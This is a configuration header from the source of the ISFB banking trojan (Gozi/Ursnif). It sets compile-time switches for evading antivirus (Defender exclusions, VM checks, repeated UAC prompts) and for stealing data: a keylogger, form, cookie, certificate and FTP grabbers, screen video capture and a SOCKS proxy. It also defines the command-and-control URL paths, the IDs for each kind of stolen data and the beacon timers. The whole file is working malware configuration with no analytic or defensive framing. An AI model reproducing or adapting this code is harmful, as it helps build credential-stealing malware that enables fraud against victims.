//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ISFB project. Version 2.13.24.1
//	
// module: config.c
// $Revision: 456 $
// $Date: 2015-01-24 21:56:51 +0300 (Сб, 24 янв 2015) $
// description:
//	ISFB configuration file. Contains global constants and definitions.

#pragma once

// Enables screen capture into a video file
#define		_ENABLE_VIDEO

// Wait for a user input (mouse event) before installation
#define		_WAIT_USER_INPUT

// Check if the installer is running on a VM and do not install the software in this case
#define		_CHECK_VM

// Add installer or client dll path to MSSE and Defenter exclusion list
#define		_MSSE_EXCLUSION

// Use ZIP compression engine instead of a CAB (requires ZipLib)
#define		_USE_ZIP

// Request UAC elevation in a loop
#define		_REQUEST_UAC

#if _INJECT_AS_IMAGE
	// Register EXE-file within Windows autorun and use it as a loader for DLLs,
	//	instead of registering DLLs directly.
	#define		_EXE_LOADER
	#define		_REGISTER_EXE

	// Make a screenshot of a current desktop and sets it as a wallpaper to hide restarting the Explorer
	#define		_SAVE_DESKTOP
#endif

// Enables LOAD_INI commad and an INI-file stored within the registry.
#define		_LOAD_INI

// Enables LOAD_REG_DLL and UNREG_DLL commands and DLL-load autorun code
#define		_LOAD_REG_DLL

// Update software group ID when installing
#define		_UPDATE_GROUP_ID

//  Write current User ID to the POST-form log 
//#define		_LOG_USER_ID

// Use HTTPs requests to the server instead of HTTP
//#define		_USE_HTTPS

// Request and execute task-files from the Explorer process
#define		_TASK_FROM_EXPLORER

// Enable URL_BLOCK/URL_UNBLOCK commands
#define		_URL_BLOCK_COMMAND

// Enable division on privileged and unprivileged commands 
// Unprivileged commands can be accepted without digital signature
//#define		_PRIVILEGED_COMMANDS

// Log command execution status into the separate file and send it while requesting a new command
#define		_LOG_COMMANDS

// Use HTTP POST request for commands
//#define		_POST_COMMANDS

// Send grabbed HTTP forms immediately. 
// Otherwise forms are being collected and being sent by a timer.
//#define		_SEND_FORMS

// FORMS_ON/FORMS_OFF doesn't affect grabbing HTTPs. It stays always enabled.
//#define		_ALWAYS_HTTPS

// Support ISFB plugins
#define		_USE_PLUGINS

// Send parameters aka source URL, Referer and ID to the full replace URL
//#define		_FULL_REPLACE_PARAMETERS	TRUE

// Uses '**' mask to copy the specified part of a source text while replacing it
#define		_REPLACE_COPY_MASK

// Enable backconnect service requests
///#define		_ENABLE_BACKCONNECT

// Enable mail grabber
//#define		_GRAB_MAIL

// Enable FTP accounts grabber
//#define		_GRAB_FTP

// Enable SOCKS4/5 server module
#define		_ENABLE_SOCKS

// Enable Key-Logger
#define		_ENABLE_KEYLOG

// Enable System information collector
#define		_ENABLE_SYSINFO

// Send System information as UTF-8 (otherwize UTF-16 used)
#define		_SYSINFO_UTF8

// Enable Certificates grabber
#define		_ENABLE_CERTS

// Enable logging and sending the log file by GET_LOG command.
#define		_ENABLE_LOGGING

// Install in user-mode: use ActiveDLL engine for injecting the client DLL.
#define		_USER_MODE_INSTALL

// Check config and task file digital signatures
// Ignore config and task if the signature missing or incorrect
#define		_CHECK_DIGITAL_SIGNATURE

// Disable automatic HTTP-redirection within WININET
//#define		_IE_DISABLE_REDIRECT

// Patch HTTP request headers before full content replace
// Since we don't need to receive any data from a server we make an invalid request there.
#define		_PATCH_REPLACE_HEADERS

// Verifies digital signature of all received data aka loaded modules, DLLs and so on.
#define		_VERIFY_RECEIVED_DATA

// Encrypts all data being sent to the server with the server key
// Active host must support receiving of encrypted data
#define		_ENCRYPT_SENT_DATA

// Ecrypts config, task, and data request URIs
// Active host must support encrypted URIs
#define		_ENCRYPT_REQUEST_URI

// Generate host names dynamicaly
// #define		_DYNAMIC_HOSTS

// Number of bot groups by machine SID
#define		NUMBER_BOT_GROUPS	4

// Maximum number of hosts per each group
#define		HOSTS_PER_GROUP		10

// Static host names array (used when _DYNAMIC_HOSTS disabled)
#define		Hosts							\
			{								\
                _T("u"),	\
			}

// Domain zones for generating dynamic host names
#define		Zones				\
			{					\
				_T("u"),		\
			}

// Default server key to encrypt request URLs and a data being sent
#define	SERVER_DEFAULT_KEY	"0123456789ABCDEF\0"

#ifdef	_ENCRYPT_REQUEST_URI
	// Where to get config from
	#define		g_ConfigURL		_T("/c%s.php?%s=")

	// Where to get tasks from
	#define		g_TaskURL		_T("/t%s.php?%s=")

	// BC request URL
	#define		g_BcURL			_T("/b%s.php?%s=")

	// Log data URL
	#define		g_DataURL		_T("/d%s.php?%s=")
#else
	// Where to get config from
	#define		g_ConfigURL		_T("/config.php?")

	// Where to get tasks from
	#define		g_TaskURL		_T("/task.php?")

	// BC request URL
	#define		g_BcURL			_T("/bc.php?")

	// Log data URL
	#define		g_DataURL		_T("/data.php?")
#endif

// Where to send data
#define		g_FormURL			szDataUrl

// IDs for sent data
#define		SEND_ID_UNKNOWN		0	
#define		SEND_ID_FORM		1	// grabbed form (ASCII headers + binary form data as it is)
#define		SEND_ID_FILE		2	// any file (binary, file as it is)
#define		SEND_ID_AUTH		3	// IE basic authentication data (ACSII text)
#define		SEND_ID_CERTS		4	// certificates (archive containing folders with certificates (PFX))
#define		SEND_ID_COOKIES		5	// cookies (archive containing folders with cookie files)
#define		SEND_ID_SYSINFO		6	// system information (archive containing a text file)
#define		SEND_ID_SCRSHOT		7	// screenshot (GIF)
#define		SEND_ID_LOG			8	// client log (ACSII text)
#define		SEND_ID_FTP			9	// FTP account info (archive contating UNICODE text)
#define		SEND_ID_IM			10	// IMs sniffer data (archive contating UNICODE text)
#define		SEND_ID_KEYLOG		11	// key log (UNICODE text)
#define		SEND_ID_PAGE_REP	12	// full page replace notification (ASCII text)
#define		SEND_ID_GRAB		13	// page content grabber data (ASCII headers + binary page content as it is)
#define		SEND_ID_MAIL		14	// mail account grabber data (archive contating UNICODE text)
#define		SEND_ID_FORM1		15	// packed multiple form data (archive)
#define		SEND_ID_PLUGIN		16	// plugin notification data (binary)
#define		SEND_ID_VIDEO		17	// captured screen video
#define		SEND_ID_DEVICE		18	// device add/remove notification (ASCII text)


// Current group ID
#include "id.h"

// Current server ID
#define		DEFAULT_SERVER_ID	12

// Timer periods
#define		TaskCheckTime		2*60		// task check period (seconds)
#define 	ConfigCheckTime		5*60		// config check period (seconds)
#define		ConfigFailCheckTime	1*60		// config check period when there's no config (seconds)
#define		KnockerTime			5*60		// knocker task check period (seconds)
#define		SendDataTime		2*60		// send grabbed data timer
#define		StoreDataTime		5*60		// time period to request keylog buffer and to pack received forms 
#define		BcRequestTime		10			// back-connect request period (seconds)

// App build number
#define		g_BuildNumber		213459		// XXXYYY, where X.XX - version, YYY - revision